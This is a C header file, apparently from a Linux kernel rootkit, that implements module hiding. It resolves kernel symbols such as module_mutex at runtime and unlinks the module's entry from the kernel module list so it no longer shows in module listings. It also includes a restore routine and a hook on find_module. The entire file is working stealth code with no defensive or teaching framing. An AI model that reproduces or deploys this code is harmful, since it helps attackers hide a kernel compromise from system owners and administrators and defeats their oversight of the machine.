/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_HIDE_H
#define NVK_HIDE_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/list.h>
#include <linux/kallsyms.h>
#include <nvkmod_version.h>
#include <nvk_hook.h>

typedef void (*nvk_mutex_lock_fn)(void *);
typedef void (*nvk_mutex_unlock_fn)(void *);
typedef void *(*nvk_find_module_fn)(const char *name);

struct nvk_hide_state {
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int               hidden;
	struct nvk_hook   find_module_hook;
	nvk_find_module_fn orig_find_module;
	const char       *module_name;
};

static nvk_mutex_lock_fn   _nvk_hide_mutex_lock;
static nvk_mutex_unlock_fn _nvk_hide_mutex_unlock;
static void               *_nvk_module_mutex;
static int                 _nvk_hide_inited;

static int nvk_hide_init(void)
{
	if (_nvk_hide_inited) return 0;

	_nvk_hide_mutex_lock =
		(nvk_mutex_lock_fn)NVK_LOOKUP("mutex_lock");
	_nvk_hide_mutex_unlock =
		(nvk_mutex_unlock_fn)NVK_LOOKUP("mutex_unlock");
	_nvk_module_mutex = (void *)NVK_LOOKUP("module_mutex");

	_nvk_hide_inited = 1;
	return 0;
}

static __always_inline struct list_head *
_nvk_get_mod_list(struct nvk_this_module *mod)
{
	return (struct list_head *)((char *)mod + NVK_OFF_LIST);
}

static void nvk_mod_hide(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our, *n, *p;

	if (state->hidden) return;

	our = _nvk_get_mod_list(mod);
	n = our->next;
	p = our->prev;

	state->saved_next = n;
	state->saved_prev = p;

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	p->next = n;
	n->prev = p;
	our->next = our;
	our->prev = our;

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 1;
}

static void nvk_mod_show(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our;

	if (!state->hidden) return;

	our = _nvk_get_mod_list(mod);

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	our->next = state->saved_next;
	our->prev = state->saved_prev;
	state->saved_prev->next = our;
	state->saved_next->prev = our;

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 0;
}

static __always_inline int nvk_mod_is_hidden(struct nvk_hide_state *state)
{
	return state->hidden;
}

static void _nvk_hide_cleanup(struct nvk_hide_state *state,
			      struct nvk_this_module *mod)
{
	if (state->find_module_hook.active)
		nvk_hook_remove(&state->find_module_hook);

	if (state->hidden)
		nvk_mod_show(state, mod);
}

#define NVK_HIDE_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
			      .hidden = 0, .module_name = 0 }

#endif /* NVK_HIDE_H */
